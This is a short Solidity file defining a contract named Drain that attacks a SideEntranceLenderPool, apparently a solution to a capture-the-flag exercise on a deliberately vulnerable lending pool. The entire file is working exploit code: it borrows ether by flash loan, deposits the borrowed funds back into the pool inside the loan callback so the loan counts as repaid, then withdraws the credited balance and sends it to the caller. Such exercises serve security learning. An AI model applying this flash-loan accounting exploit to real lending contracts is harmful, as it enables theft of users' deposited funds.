// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Drain is IFlashLoanEtherReceiver {
    address public pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function drain(uint256 amount) external {
        SideEntranceLenderPool(pool).flashLoan(amount);
    }

    function withdraw() external {
        SideEntranceLenderPool(pool).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable override {
        SideEntranceLenderPool(pool).deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
